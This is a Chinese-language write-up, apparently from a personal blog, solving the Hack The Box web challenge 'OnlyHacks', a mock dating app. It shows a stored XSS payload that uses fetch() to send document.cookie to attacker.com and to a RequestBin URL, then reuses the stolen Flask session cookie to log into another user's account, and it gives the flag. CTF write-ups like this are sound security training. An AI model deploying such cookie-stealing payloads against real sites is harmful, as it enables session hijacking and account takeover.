---
title: HTB-OnlyHacks
date: 2025-04-02 13:17:12
categories: [CTF,Web]
tags: [Web,HTB,XSS]
excerpt: ""
---


## **题目描述**

![image-20250402094001430](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094001430.png)

（无附件）

## **观察**

打开网页：

![image-20250402093942965](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402093942965.png)

注册个账号试试：（注意这里一定要上传一个头像，不然会一直提示用户名重复）

![image-20250402094051656](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094051656.png)

进去之后会显示4个人，我们每个都点一下绿色的心（在dating app里应该是心动的意思）：

![image-20250402094150895](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094150895.png)

![image-20250402094203279](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094203279.png)

![image-20250402094215653](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094215653.png)

![image-20250402094226748](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094226748.png)

然后点进右上角的Mathces：

![image-20250402094342718](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094342718.png)

会发现只有一个对话框。

![image-20250402094437479](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094437479.png)

对话里没有什么有用的信息，但是我们注意到它好像是每隔一段时间（大概5到10秒左右）才会看一次我们的消息并回复，跟一般XSS的环境很像。

我们查看当前的cookie会发现：

![image-20250402094643865](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094643865.png)

![image-20250402094708577](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402094708577.png)

通过base64解码会发现这个应该是通过cookie识别我们登录的身份的。（后面的乱码部分是python的flask的session自带的签名）

## 渗透

通过XSS获取管理员身份并登录他的账号。

首先在 https://requestbin.kanbanbox.com/ 上创建一个RequestBin：

![image-20250402125110966](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402125110966.png)

![image-20250402125101276](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402125101276.png)

正常XSS攻击的模板是：

```javascript
<script>fetch("http://attacker.com?cookie=" + document.cookie); </script>
```



所以我们将我们在RequestBin创建的url放进去然后在聊天框发送：

```javascript
<script>fetch("https://requestbin.kanbanbox.com/xckrydxc?cookie=" + document.cookie); </script>
```

之后在RequestBin页面点击右上角的青色图标那里：

![image-20250402125607867](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402125607867.png)

就可以查看收到的cookie内容：

```
eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE
```

之后在浏览器里修改我们的cookie再刷新网页：

![image-20250402125801791](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402125801791.png)

![image-20250402125815441](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250402125815441.png)

可以看到我们成功登录了她的账号，还能看到我们刚才发送的消息。

flag就在另一个对话里：`HTB{d0nt_trust_str4ng3r5_bl1ndly}` 。
